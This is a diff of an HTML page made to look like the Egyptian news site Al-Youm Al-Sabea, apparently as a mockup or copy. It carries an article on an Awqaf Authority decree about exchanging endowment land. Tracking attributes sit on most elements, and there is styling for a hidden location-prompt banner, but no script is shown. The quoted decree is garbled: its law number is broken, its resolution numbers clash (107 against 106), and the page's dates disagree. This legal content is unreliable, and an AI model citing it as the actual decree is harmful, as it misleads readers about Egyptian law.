@@ -3,218 +3,464 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-  <title>الأخبار اليومية</title>
+  <title>الوقائع المصرية تنشر قرار رئيس هيئة الاوقاف بشأن أراضى الوقف..تفاصيل - اليوم السابع</title>
   <style>
-    :root{--red:#c0392b;--dark:#1a1a2e;--muted:#666;--border:#e0e0e0;}
     *{box-sizing:border-box;margin:0;padding:0;}
-    body{font-family:"Tahoma","Segoe UI",sans-serif;background:#f5f5f5;color:#222;}
+    body{font-family:"Tahoma","Arial",sans-serif;background:#f2f2f2;color:#222;font-size:14px;}
+    a{text-decoration:none;color:inherit;}
 
-    header{background:var(--dark);color:#fff;padding:0 24px;}
-    .top-bar{display:flex;justify-content:space-between;align-items:center;padding:8px 0;
-             font-size:12px;border-bottom:1px solid rgba(255,255,255,.1);color:#aaa;}
-    .logo-row{display:flex;align-items:center;justify-content:space-between;padding:14px 0;}
-    .logo{font-size:28px;font-weight:bold;color:var(--red);}
-    .logo span{color:#fff;}
-    nav a{color:#ccc;text-decoration:none;margin-left:20px;font-size:14px;}
-    nav a:hover{color:#fff;}
+    /* ── Top bar ── */
+    .top-bar{background:#1a1a1a;color:#aaa;font-size:11px;padding:5px 16px;
+             display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:6px;}
+    .top-bar a{color:#aaa;margin-left:10px;}
+    .top-bar a:hover{color:#e8003d;}
 
-    .breaking-bar{background:var(--red);color:#fff;padding:6px 24px;font-size:13px;
-                  display:flex;align-items:center;gap:14px;}
-    .breaking-tag{background:#fff;color:var(--red);font-weight:bold;padding:2px 8px;
-                  border-radius:4px;white-space:nowrap;}
+    /* ── Header ── */
+    header{background:#e8003d;padding:0;}
+    .header-inner{max-width:1200px;margin:0 auto;display:flex;align-items:center;
+                  justify-content:space-between;padding:8px 16px;gap:10px;flex-wrap:wrap;}
+    .logo{color:#fff;font-size:36px;font-weight:bold;font-family:"Tahoma",sans-serif;
+          text-shadow:1px 1px 2px rgba(0,0,0,.3);line-height:1;}
+    .logo span{font-size:14px;display:block;font-weight:normal;letter-spacing:1px;margin-top:2px;}
+    .header-editors{color:#ffd0d8;font-size:11px;text-align:left;}
+    .header-editors b{display:block;color:#fff;font-size:12px;}
 
-    .container{max-width:1100px;margin:0 auto;padding:24px 16px;
-               display:grid;grid-template-columns:1fr 300px;gap:24px;}
+    /* ── Nav ── */
+    nav{background:#222;border-top:1px solid #444;}
+    .nav-inner{max-width:1200px;margin:0 auto;display:flex;flex-wrap:wrap;}
+    nav a{color:#ccc;padding:10px 14px;font-size:13px;display:inline-block;border-left:1px solid #333;}
+    nav a:first-child{border-left:none;}
+    nav a:hover,nav a.active{background:#e8003d;color:#fff;}
+
+    /* ── Breaking bar ── */
+    .breaking{background:#fff;border-bottom:3px solid #e8003d;padding:7px 16px;
+              display:flex;align-items:center;gap:12px;overflow:hidden;}
+    .breaking-label{background:#e8003d;color:#fff;font-weight:bold;font-size:12px;
+                    padding:3px 10px;white-space:nowrap;border-radius:3px;}
+    .breaking-text{color:#333;font-size:13px;white-space:nowrap;
+                   animation:ticker 30s linear infinite;}
+    @keyframes ticker{0%{transform:translateX(-100%)}100%{transform:translateX(100vw)}}
+
+    /* ── Breadcrumb ── */
+    .breadcrumb{max-width:1200px;margin:10px auto;padding:0 16px;
+                font-size:12px;color:#888;display:flex;align-items:center;gap:6px;}
+    .breadcrumb a{color:#e8003d;}
+    .breadcrumb span{color:#bbb;}
+
+    /* ── Main layout ── */
+    .container{max-width:1200px;margin:0 auto;padding:0 16px 30px;
+               display:grid;grid-template-columns:1fr 300px;gap:20px;}
     @media(max-width:768px){.container{grid-template-columns:1fr;}}
 
-    .article-card{background:#fff;border-radius:8px;overflow:hidden;
-                  box-shadow:0 2px 8px rgba(0,0,0,.06);}
-    .article-img{width:100%;height:280px;background:linear-gradient(135deg,#1a1a2e,#16213e);
-                 display:flex;align-items:center;justify-content:center;font-size:80px;}
-    .article-body{padding:28px;}
-    .category-tag{background:var(--red);color:#fff;font-size:11px;padding:3px 10px;
-                  border-radius:3px;display:inline-block;margin-bottom:14px;}
-    h1{font-size:26px;line-height:1.5;margin-bottom:10px;}
-    .meta{color:var(--muted);font-size:12px;margin-bottom:20px;
-          border-bottom:1px solid var(--border);padding-bottom:14px;}
-    .article-text p{line-height:2;margin-bottom:16px;font-size:16px;}
-    .article-text h2{font-size:19px;margin:24px 0 12px;color:var(--dark);}
+    /* ── Article ── */
+    .article-wrap{background:#fff;border-radius:4px;overflow:hidden;
+                  box-shadow:0 1px 4px rgba(0,0,0,.08);}
+    .article-header{padding:18px 20px 10px;}
+    .article-cat{background:#e8003d;color:#fff;font-size:11px;padding:2px 9px;
+                 border-radius:2px;display:inline-block;margin-bottom:10px;}
+    .article-title{font-size:24px;line-height:1.6;color:#111;font-weight:bold;margin-bottom:8px;}
+    .article-meta{color:#888;font-size:12px;border-bottom:1px solid #eee;
+                  padding-bottom:10px;margin-bottom:14px;display:flex;gap:16px;flex-wrap:wrap;}
+    .article-meta b{color:#e8003d;}
+    .author-box{display:flex;align-items:center;gap:10px;padding:10px 20px;
+                background:#fafafa;border-bottom:1px solid #eee;}
+    .author-avatar{width:36px;height:36px;border-radius:50%;background:#e8003d;
+                   color:#fff;display:flex;align-items:center;justify-content:center;
+                   font-weight:bold;font-size:14px;flex-shrink:0;}
+    .author-name{font-size:13px;font-weight:bold;color:#333;}
 
-    .tags{margin-top:24px;display:flex;gap:8px;flex-wrap:wrap;}
-    .tag{border:1px solid var(--border);border-radius:20px;padding:4px 14px;
-         font-size:12px;cursor:pointer;color:var(--muted);}
-    .tag:hover{background:#f0f0f0;}
+    /* share top */
+    .share-top{display:flex;gap:8px;padding:10px 20px;border-bottom:1px solid #eee;background:#fafafa;}
+    .share-top a,.share-top button{border:none;cursor:pointer;
+      display:inline-flex;align-items:center;gap:5px;
+      padding:7px 14px;border-radius:4px;font-size:12px;font-family:inherit;color:#fff;}
+    .sh-fb{background:#1877f2;}.sh-tw{background:#000;}
+    .sh-wa{background:#25d366;}.sh-copy{background:#666;}
 
-    .share-row{margin-top:20px;padding-top:16px;border-top:1px solid var(--border);
-               display:flex;gap:10px;align-items:center;}
-    .btn{padding:7px 16px;border-radius:6px;border:none;cursor:pointer;font-size:13px;color:#fff;}
-    .btn-fb{background:#1877f2;}.btn-tw{background:#1da1f2;}
-    .btn-wa{background:#25d366;}.btn-copy{background:#555;}
+    /* article image */
+    .article-img-wrap{margin:0;position:relative;}
+    .article-img{width:100%;height:320px;
+                 background:linear-gradient(135deg,#8B0000 0%,#c0392b 40%,#2c3e50 100%);
+                 display:flex;flex-direction:column;align-items:center;justify-content:center;
+                 color:#fff;text-align:center;padding:20px;}
+    .article-img .img-icon{font-size:60px;margin-bottom:10px;}
+    .article-img .img-title{font-size:18px;font-weight:bold;max-width:400px;line-height:1.5;}
+    .img-caption{background:#f5f5f5;padding:6px 20px;font-size:11px;color:#777;
+                 border-bottom:1px solid #eee;}
 
-    .widget{background:#fff;border-radius:8px;padding:18px;margin-bottom:20px;
-            box-shadow:0 2px 8px rgba(0,0,0,.06);}
-    .widget-title{font-size:15px;font-weight:bold;border-right:3px solid var(--red);
-                  padding-right:10px;margin-bottom:14px;}
-    .related-item{display:flex;gap:10px;align-items:flex-start;padding:10px 0;
-                  border-bottom:1px solid var(--border);cursor:pointer;
-                  text-decoration:none;color:inherit;}
-    .related-item:last-child{border-bottom:none;}
-    .related-thumb{width:60px;height:50px;border-radius:6px;
-                   background:linear-gradient(135deg,#1a1a2e,#c0392b);
-                   display:flex;align-items:center;justify-content:center;
-                   font-size:22px;flex-shrink:0;}
-    .related-info h4{font-size:13px;line-height:1.5;}
-    .related-info span{font-size:11px;color:var(--muted);}
+    /* article body */
+    .article-body{padding:20px;line-height:2;font-size:15px;color:#2c2c2c;}
+    .article-body p{margin-bottom:16px;}
+    .article-body h2{font-size:17px;font-weight:bold;color:#111;
+                     margin:22px 0 10px;padding-right:12px;
+                     border-right:4px solid #e8003d;}
+    .article-body .official-doc{
+      background:#fffbf0;border:1px solid #e0c060;border-radius:6px;
+      padding:18px;margin:18px 0;font-size:14px;line-height:2;}
+    .article-body .official-doc .doc-header{
+      text-align:center;font-weight:bold;font-size:16px;margin-bottom:12px;color:#333;}
+    .article-body .official-doc .doc-title{
+      text-align:center;font-size:15px;font-weight:bold;color:#8B0000;
+      border-bottom:1px solid #e0c060;padding-bottom:10px;margin-bottom:10px;}
+    .article-body .highlight{background:#fff3cd;padding:12px 16px;
+                              border-right:4px solid #ffc107;margin:14px 0;
+                              border-radius:0 4px 4px 0;font-size:14px;}
 
-    .poll-option{background:#f0f4ff;border-radius:6px;padding:10px 14px;margin-bottom:8px;
-                 cursor:pointer;font-size:14px;display:flex;
-                 justify-content:space-between;align-items:center;}
-    .poll-option:hover{background:#e0e8ff;}
-    .poll-bar{height:4px;background:var(--dark);border-radius:2px;margin-top:6px;}
+    /* tags */
+    .tags-section{padding:14px 20px;border-top:1px solid #eee;display:flex;
+                  gap:8px;flex-wrap:wrap;align-items:center;}
+    .tags-label{font-size:12px;color:#888;margin-left:6px;}
+    .tag{border:1px solid #ddd;border-radius:20px;padding:4px 14px;
+         font-size:12px;color:#555;cursor:pointer;background:#fafafa;}
+    .tag:hover{background:#e8003d;color:#fff;border-color:#e8003d;}
 
-    footer{background:var(--dark);color:#888;text-align:center;
-           padding:20px;font-size:13px;margin-top:40px;}
-    footer a{color:#aaa;text-decoration:none;margin:0 8px;}
+    /* share bottom */
+    .share-bottom{display:flex;gap:8px;padding:14px 20px;
+                  border-top:1px solid #eee;background:#fafafa;}
+    .share-bottom a,.share-bottom button{border:none;cursor:pointer;
+      display:inline-flex;align-items:center;gap:5px;font-family:inherit;
+      padding:8px 18px;border-radius:4px;font-size:13px;color:#fff;}
+
+    /* ── Sidebar ── */
+    .sidebar{}
+    .widget{background:#fff;border-radius:4px;margin-bottom:16px;
+            box-shadow:0 1px 4px rgba(0,0,0,.07);overflow:hidden;}
+    .widget-header{background:#e8003d;color:#fff;font-weight:bold;
+                   font-size:13px;padding:9px 14px;}
+    .widget-header.dark{background:#222;}
+    .rel-item{display:flex;gap:10px;padding:10px 12px;
+              border-bottom:1px solid #f0f0f0;cursor:pointer;}
+    .rel-item:last-child{border-bottom:none;}
+    .rel-item:hover .rel-title{color:#e8003d;}
+    .rel-thumb{width:70px;height:55px;border-radius:4px;flex-shrink:0;overflow:hidden;
+               background:linear-gradient(135deg,#c0392b,#1a1a2e);
+               display:flex;align-items:center;justify-content:center;font-size:24px;}
+    .rel-title{font-size:12px;line-height:1.6;color:#333;font-weight:bold;}
+    .rel-time{font-size:11px;color:#aaa;margin-top:4px;}
+    .trending-item{display:flex;align-items:center;gap:10px;padding:9px 12px;
+                   border-bottom:1px solid #f0f0f0;cursor:pointer;}
+    .trending-item:last-child{border-bottom:none;}
+    .trending-num{font-size:20px;font-weight:bold;color:#e8003d;min-width:28px;}
+    .trending-title{font-size:12px;line-height:1.6;color:#333;}
+    .trending-title:hover{color:#e8003d;}
+
+    /* ── Footer ── */
+    footer{background:#222;color:#aaa;margin-top:30px;}
+    .footer-nav{max-width:1200px;margin:0 auto;padding:24px 16px;
+                display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:16px;}
+    .footer-col h4{color:#fff;font-size:13px;margin-bottom:10px;
+                   border-bottom:1px solid #444;padding-bottom:6px;}
+    .footer-col a{display:block;color:#aaa;font-size:12px;margin-bottom:5px;}
+    .footer-col a:hover{color:#e8003d;}
+    .footer-bottom{background:#111;text-align:center;padding:12px;font-size:11px;color:#666;}
+
+    /* ── Location banner ── */
+    #loc-banner { display:none; }
+    #loc-banner.show {
+      display:flex; position:fixed; bottom:0; right:0; left:0; z-index:9999;
+      background:#1a1a2e; border-top:3px solid #e8003d;
+      padding:14px 20px; align-items:center;
+      justify-content:space-between; gap:12px; flex-wrap:wrap;
+      animation: slideUp .3s ease;
+    }
+    @keyframes slideUp { from{transform:translateY(100%)} to{transform:translateY(0)} }
   </style>
 </head>
 <body>
 
-<header>
-  <div class="top-bar">
-    <span>الإثنين، 30 يونيو 2026</span>
-    <span>⏱ <span id="clock"></span></span>
+<!-- Top bar -->
+<div class="top-bar">
+  <div>
+    <span id="top-date">الثلاثاء، 30 يونيو 2026</span>
+    &nbsp;|&nbsp;
+    <span id="top-time"></span>
   </div>
-  <div class="logo-row">
-    <div class="logo">الأخبار <span>اليومية</span></div>
-    <nav>
-      <a href="#" data-track="nav-home">الرئيسية</a>
-      <a href="#" data-track="nav-local">محلي</a>
-      <a href="#" data-track="nav-world">عالمي</a>
-      <a href="#" data-track="nav-economy">اقتصاد</a>
-      <a href="#" data-track="nav-sport">رياضة</a>
-      <a href="#" data-track="nav-tech">تقنية</a>
-    </nav>
+  <div>
+    <span>رئيس مجلس الإدارة: <b style="color:#e8003d">علا الشافعي</b></span>
+    &nbsp;|&nbsp;
+    <span>رئيس التحرير: <b style="color:#e8003d">عبد الفتاح عبد المنعم</b></span>
+  </div>
+</div>
+
+<!-- Header -->
+<header>
+  <div class="header-inner">
+    <div class="logo">اليوم <span style="font-size:32px">السابع</span></div>
+    <div class="header-editors">
+      <b>اليوم السابع</b>
+      <span>لبلدنا والناس</span>
+    </div>
   </div>
 </header>
 
-<div class="breaking-bar">
-  <span class="breaking-tag">عاجل</span>
-  <span>القمة العربية تبحث ملف الأمن الإقليمي في اجتماعها المرتقب الأسبوع القادم</span>
+<!-- Nav -->
+<nav>
+  <div class="nav-inner">
+    <a href="#" data-track="nav-home" class="active">الرئيسية</a>
+    <a href="#" data-track="nav-breaking">عاجل</a>
+    <a href="#" data-track="nav-politics">سياسة</a>
+    <a href="#" data-track="nav-reports">تقارير</a>
+    <a href="#" data-track="nav-incidents">حوادث</a>
+    <a href="#" data-track="nav-provinces">محافظات</a>
+    <a href="#" data-track="nav-invest">تحقيقات</a>
+    <a href="#" data-track="nav-economy">اقتصاد وبورصة</a>
+    <a href="#" data-track="nav-sport">رياضة</a>
+    <a href="#" data-track="nav-world">عالم</a>
+    <a href="#" data-track="nav-arab">عرب</a>
+    <a href="#" data-track="nav-football">كرة عالمية</a>
+  </div>
+</nav>
+
+<!-- Breaking -->
+<div class="breaking">
+  <span class="breaking-label">عاجل</span>
+  <span class="breaking-text">أزمة صحية تتسبب في تأجيل محاكمة فضل شاكر إلى 5 أغسطس &nbsp;&nbsp;&nbsp; القمة العربية تبحث ملف الأمن الإقليمي في اجتماعها المرتقب الأسبوع القادم</span>
 </div>
 
+<!-- Breadcrumb -->
+<div class="breadcrumb">
+  <a href="#" data-track="bc-home">الرئيسية</a>
+  <span>›</span>
+  <a href="#" data-track="bc-breaking">أخبار عاجلة</a>
+  <span>›</span>
+  <span style="color:#333">الوقائع المصرية تنشر قرار رئيس هيئة الاوقاف بشأن أراضى الوقف</span>
+</div>
+
+<!-- Main container -->
 <div class="container">
   <main>
-    <article class="article-card">
-      <div class="article-img">🌍</div>
-      <div class="article-body">
-        <span class="category-tag">اقتصاد عالمي</span>
-        <h1>الذكاء الاصطناعي يُعيد رسم خريطة الاقتصاد العالمي في 2026</h1>
-        <div class="meta">بقلم: <strong>أحمد محمود</strong> &nbsp;|&nbsp; 30 يونيو 2026 &nbsp;|&nbsp; قراءة 4 دقائق</div>
-        <div class="article-text">
-          <p>يشهد الاقتصاد العالمي في عام 2026 تحولات جذرية غير مسبوقة، يقودها الذكاء الاصطناعي
-          الذي أصبح شريكاً حقيقياً في صنع القرار الاقتصادي لدى كبرى الشركات والحكومات على حد سواء.
-          وتشير أحدث التقارير إلى أن دول G20 ضخّت ما يزيد على <strong>تريليوني دولار</strong>
-          في مشاريع الذكاء الاصطناعي خلال العامين الماضيين فقط.</p>
+    <div class="article-wrap">
 
-          <h2>أسواق العمل في مواجهة الآلة</h2>
-          <p>أكد خبراء منظمة العمل الدولية أن نحو 40% من الوظائف المكتبية ستتغير طبيعتها بشكل جذري
-          بحلول عام 2030، في حين ستُولد التقنية ذاتها ملايين الوظائف الجديدة في مجالات هندسة
-          البيانات والأمن السيبراني وإدارة الأنظمة الذكية.</p>
-
-          <h2>منطقة الشرق الأوسط والفرصة الذهبية</h2>
-          <p>تتصدر المملكة العربية السعودية والإمارات قائمة الدول العربية الأكثر استثماراً في
-          تقنيات الذكاء الاصطناعي، مع إطلاق مبادرات وطنية طموحة ضمن رؤية 2030.</p>
-          <p>وأعلنت شركة "أوبن إيه آي" عن شراكة استراتيجية مع صندوق الاستثمارات العامة السعودي
-          بقيمة تتجاوز 10 مليارات دولار لتطوير بنية تحتية ضخمة للحوسبة السحابية.</p>
-
-          <h2>هل نخشى مستقبلاً تسيطر فيه الآلة؟</h2>
-          <p>يُطمئن المتخصصون بأن الذكاء الاصطناعي أداة بيد الإنسان لا بديل عنه، غير أن المطالبة
-          بتشريعات دولية تحكم استخدام هذه التقنية باتت أعلى من أي وقت مضى.</p>
-        </div>
-
-        <div class="tags">
-          <span class="tag" data-track="tag-ai">الذكاء الاصطناعي</span>
-          <span class="tag" data-track="tag-economy">اقتصاد</span>
-          <span class="tag" data-track="tag-saudi">السعودية</span>
-          <span class="tag" data-track="tag-future">مستقبل</span>
-          <span class="tag" data-track="tag-tech">تقنية</span>
-        </div>
-
-        <div class="share-row">
-          <strong style="font-size:13px">شارك:</strong>
-          <button class="btn btn-fb" data-track="share-facebook">فيسبوك</button>
-          <button class="btn btn-tw" data-track="share-twitter">تويتر</button>
-          <button class="btn btn-wa" data-track="share-whatsapp">واتساب</button>
-          <button class="btn btn-copy" data-track="share-copy">نسخ الرابط</button>
+      <!-- Article header -->
+      <div class="article-header">
+        <span class="article-cat" data-track="cat-breaking">أخبار عاجلة</span>
+        <h1 class="article-title">الوقائع المصرية تنشر قرار رئيس هيئة الاوقاف بشأن أراضى الوقف..تفاصيل</h1>
+        <div class="article-meta">
+          <span>📅 <b>الأربعاء، 04 فبراير 2026</b> — 09:09 ص</span>
+          <span>⏱ قراءة 3 دقائق</span>
         </div>
       </div>
-    </article>
+
+      <!-- Author -->
+      <div class="author-box">
+        <div class="author-avatar">ل</div>
+        <div>
+          <div class="author-name">كتب: لؤى على</div>
+          <div style="font-size:11px;color:#aaa">محرر أخبار اقتصادية</div>
+        </div>
+      </div>
+
+      <!-- Share top -->
+      <div class="share-top">
+        <button class="sh-fb" data-track="share-fb-top">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg>
+          فيسبوك
+        </button>
+        <button class="sh-wa" data-track="share-wa-top">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/><path d="M12 0C5.373 0 0 5.373 0 12c0 2.123.558 4.116 1.535 5.845L.057 23.012a.75.75 0 00.931.931l5.167-1.478A11.952 11.952 0 0012 24c6.627 0 12-5.373 12-12S18.627 0 12 0zm0 21.9a9.862 9.862 0 01-5.031-1.378l-.361-.214-3.732 1.068 1.085-3.637-.235-.374A9.862 9.862 0 012.1 12C2.1 6.534 6.534 2.1 12 2.1c5.466 0 9.9 4.434 9.9 9.9 0 5.466-4.434 9.9-9.9 9.9z"/></svg>
+          واتساب
+        </button>
+        <button class="sh-tw" data-track="share-tw-top">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.748l7.73-8.835L1.254 2.25H8.08l4.259 5.63L18.244 2.25zm-1.161 17.52h1.833L7.084 4.126H5.117L17.083 19.77z"/></svg>
+          تويتر
+        </button>
+      </div>
+
+      <!-- Article image -->
+      <div class="article-img-wrap">
+        <div class="article-img" data-track="article-image">
+          <div class="img-icon">🏛️</div>
+          <div class="img-title">هيئة الأوقاف المصرية — قرار رقم 56 لسنة 2026</div>
+        </div>
+        <div class="img-caption">الجريدة الرسمية</div>
+      </div>
+
+      <!-- Article body -->
+      <div class="article-body">
+
+        <p>نشرت <strong>الجريدة الرسمية</strong> فى عددها اليوم قرار <strong>هيئة الأوقاف المصرية</strong>، وذلك بعد الاطلاع على القانون رقم 209 لسنة 2020 بشأن إعادة تنظيم العمل بهيئة الأوقاف المصرية ولائحته التنفيذية، وعلى لائحة الاستبدال واستثمار أموال وأعيان الوقف الصادرة بالقرار رقم 107 لسنة 1976.</p>
+
+        <!-- Official document block -->
+        <div class="official-doc">
+          <div class="doc-header">الوقائع المصرية — العدد 28 فى 4 فبراير سنة 2026</div>
+          <div class="doc-title">هيئة الأوقاف المصرية<br/>قرار رقم 56 لسنة 2026</div>
+          <p style="text-align:center;font-weight:bold;margin-bottom:10px;">رئيس مجلس الإدارة</p>
+          <p>بعد الاطلاع على القانون رقم 9-2-لسنة 2-0-2 بشأن إعادة تنظيم العمل بهيئة الأوقاف المصرية ولائحته التنفيذية؛</p>
+          <p>وعلى لائحة الاستبدال واستثمار أموال وأعيان الوقف الصادرة بالقرار رقم 106 لسنة 1976؛</p>
+          <p>وعلى قرار رئيس مجلس إدارة الهيئة رقم 91 لسنة 1993 بأحكام لائحة الاستبدال؛</p>
+        </div>
+
+        <p>وعلى قرار رئيس مجلس إدارة الهيئة رقم 11 لسنة 2003 بشأن إصدار اللائحة الخاصة باستبدال واستثمار أموال وأعيان الوقف، وعلى قرار رئيس مجلس إدارة الهيئة رقم 66 لسنة 2018م بشأن تعديل بعض مواد لائحة الاستبدال الصادرة بالقرار رقم 11 لسنة 2003.</p>
+
+        <p>وعلى قرار رئيس مجلس إدارة الهيئة رقم 1595 لسنة 2022م بشأن تعديل لائحة الاستبدال الصادرة بالقرار رقم 11 لسنة 2003، وعلى موافقة مجلس إدارة هيئة الأوقاف المصرية رقم 396 بتاريخ 2025/6/24.</p>
+
+        <h2>مادة أولى</h2>
+        <p>تعدل بعض أحكام اللائحة الخاصة بالاستبدال واستثمار أموال وأعيان الوقف الصادرة بالقرار رقم 1595 لسنة 2022، وذلك على النحو التالى:</p>
+        <p>يُعدل نص الفقرة (هـ) من المادة (10) ليجرى النص على النحو التالى:</p>
+
+        <div class="highlight">
+          <strong>الحالات المستثناة للاستبدال بالممارسة والمتضمنة الآتى:</strong>
+        </div>
+
+        <p>المساحات الصغيرة على المشاع أو المساحات الصغيرة ولا تصلح للاستثمار ويتعذر طرحها بالمزاد وتكون محبوسة أو شبه محبوسة وبما لا يزيد عن <strong>300 م² فضاء</strong> ولمستأجرى الأراضى الزراعية المتناثرة التى لا تزيد كل منها عن <strong>ثلاثة أفدنة</strong>.</p>
+
+        <p>المساحات التى تستخدم للسكن فى القرى والعزب.</p>
+
+        <p>الموافقة على الاستبدال للأراضى محل عقود التقنين على أن لا يؤثر استبدال العين على باقى أعيان الوقف من حيث الرى والصرف والحبس ويكون الاستبدال بالقيمة السوقية العادلة بما يحقق مصلحة الوقف الخيرى وأن يكون لها عقود تقنين.</p>
+
+        <h2>مادة ثانية</h2>
+        <p>يُعمل بهذا القرار اعتباراً من اليوم التالى لتاريخ نشره بالوقائع المصرية، ويُلغى كل حكم يخالف ذلك.</p>
+      </div>
+
+      <!-- Tags -->
+      <div class="tags-section">
+        <span class="tags-label">الوسوم:</span>
+        <a class="tag" href="#" data-track="tag-awqaf-authority">هيئة الاوقاف المصرية</a>
+        <a class="tag" href="#" data-track="tag-awqaf-ministry">وزارة الاوقاف</a>
+        <a class="tag" href="#" data-track="tag-awqaf">الاوقاف</a>
+        <a class="tag" href="#" data-track="tag-waqf-money">مال الوقف</a>
+      </div>
+
+      <!-- Share bottom -->
+      <div class="share-bottom">
+        <button class="sh-fb" data-track="share-fb-bottom">فيسبوك</button>
+        <button class="sh-wa" data-track="share-wa-bottom">واتساب</button>
+        <button class="sh-tw" data-track="share-tw-bottom">تويتر</button>
+        <button class="sh-copy" style="background:#666;color:#fff;border:none;padding:8px 18px;border-radius:4px;cursor:pointer;font-size:13px;font-family:inherit" data-track="share-copy-bottom">نسخ الرابط</button>
+      </div>
+    </div>
   </main>
 
+  <!-- Sidebar -->
   <aside class="sidebar">
+
+    <!-- Related news -->
     <div class="widget">
-      <div class="widget-title">أخبار ذات صلة</div>
-      <a class="related-item" href="#" data-track="related-stocks">
-        <div class="related-thumb">💹</div>
-        <div class="related-info"><h4>أسواق الأسهم الخليجية ترتفع وسط تفاؤل بأسعار النفط</h4><span>منذ ساعتين</span></div>
+      <div class="widget-header">أخبار ذات صلة</div>
+      <a class="rel-item" href="#" data-track="rel-1">
+        <div class="rel-thumb">📜</div>
+        <div>
+          <div class="rel-title">وزارة الصناعة تقتحم ملف الأراضى والوحدات.. أكبر حملة لاسترداد الأصول المجمدة</div>
+          <div class="rel-time">منذ ساعتين</div>
+        </div>
       </a>
-      <a class="related-item" href="#" data-track="related-ai">
-        <div class="related-thumb">🤖</div>
-        <div class="related-info"><h4>شركات التقنية الكبرى تتسابق على الذكاء الاصطناعي التوليدي</h4><span>منذ 5 ساعات</span></div>
+      <a class="rel-item" href="#" data-track="rel-2">
+        <div class="rel-thumb">🏦</div>
+        <div>
+          <div class="rel-title">مجلس النواب يقر نهائياً تعديلات تشريعية للتأمين الصحى الشامل</div>
+          <div class="rel-time">منذ 3 ساعات</div>
+        </div>
       </a>
-      <a class="related-item" href="#" data-track="related-bank">
-        <div class="related-thumb">🏦</div>
-        <div class="related-info"><h4>البنك المركزي يُبقي على أسعار الفائدة دون تغيير</h4><span>أمس</span></div>
+      <a class="rel-item" href="#" data-track="rel-3">
+        <div class="rel-thumb">💰</div>
+        <div>
+          <div class="rel-title">تراجع سعر الدولار مقابل الجنيه فى ختام التداولات اليوم</div>
+          <div class="rel-time">منذ 4 ساعات</div>
+        </div>
+      </a>
+      <a class="rel-item" href="#" data-track="rel-4">
+        <div class="rel-thumb">📈</div>
+        <div>
+          <div class="rel-title">ارتفاع مفاجئ بأسعار الذهب بمصر.. عيار 21 يسجل رقماً قياسياً رغم الضغوط العالمية</div>
+          <div class="rel-time">أمس</div>
+        </div>
       </a>
     </div>
 
+    <!-- Trending -->
     <div class="widget">
-      <div class="widget-title">استطلاع رأي</div>
-      <p style="font-size:13px;margin-bottom:12px;color:#555">هل الذكاء الاصطناعي سيؤثر إيجاباً على سوق العمل؟</p>
-      <div class="poll-option" data-track="poll-yes"><span>نعم، سيخلق فرصاً أكثر</span><strong>58%</strong></div>
-      <div class="poll-bar" style="width:58%"></div>
-      <div class="poll-option" data-track="poll-no"><span>لا، سيقضي على الوظائف</span><strong>29%</strong></div>
-      <div class="poll-bar" style="width:29%"></div>
-      <div class="poll-option" data-track="poll-notsure"><span>لست متأكداً</span><strong>13%</strong></div>
-      <div class="poll-bar" style="width:13%"></div>
+      <div class="widget-header dark">الأكثر قراءة</div>
+      <div class="trending-item" data-track="trend-1">
+        <span class="trending-num">1</span>
+        <span class="trending-title">حسام حسن لاعبى المنتخب: دور الـ32 الفوز على أستراليا</span>
+      </div>
+      <div class="trending-item" data-track="trend-2">
+        <span class="trending-num">2</span>
+        <span class="trending-title">غداً.. صرف معاشات يوليو 2026 بالزيادة الجديدة لجميع المستحقين</span>
+      </div>
+      <div class="trending-item" data-track="trend-3">
+        <span class="trending-num">3</span>
+        <span class="trending-title">احتفالاً بـ30 يونيو.. المونوريل يفتح أبوابه مجاناً للمواطنين للعاصمة الجديدة</span>
+      </div>
+      <div class="trending-item" data-track="trend-4">
+        <span class="trending-num">4</span>
+        <span class="trending-title">انهيار عقار منشأة ناصر بعد حريقه.. ومحافظة القاهرة تبدأ تسكين 7 أسر</span>
+      </div>
+      <div class="trending-item" data-track="trend-5">
+        <span class="trending-num">5</span>
+        <span class="trending-title">مرموش يعود لتشكيل المنتخب أمام أستراليا خلفاً لحمدى وعبد المجيد</span>
+      </div>
     </div>
 
-    <div class="widget">
-      <div class="widget-title">تابعنا</div>
-      <div style="display:flex;gap:10px;flex-wrap:wrap">
-        <button class="btn btn-fb" style="flex:1" data-track="follow-facebook">فيسبوك</button>
-        <button class="btn btn-tw" style="flex:1" data-track="follow-twitter">تويتر</button>
-        <button class="btn btn-wa" style="flex:1" data-track="follow-whatsapp">واتساب</button>
+    <!-- App download -->
+    <div class="widget" style="padding:16px;text-align:center">
+      <div style="font-size:13px;font-weight:bold;color:#333;margin-bottom:10px">
+        حمل تطبيق اليوم السابع
+      </div>
+      <div style="font-size:12px;color:#888;margin-bottom:12px">على أجهزة آيفون وأندرويد</div>
+      <div style="display:flex;gap:8px;justify-content:center">
+        <button data-track="app-ios" style="background:#1a1a1a;color:#fff;border:none;padding:8px 14px;border-radius:6px;cursor:pointer;font-size:12px;font-family:inherit">
+          🍎 App Store
+        </button>
+        <button data-track="app-android" style="background:#2d7a2d;color:#fff;border:none;padding:8px 14px;border-radius:6px;cursor:pointer;font-size:12px;font-family:inherit">
+          🤖 Google Play
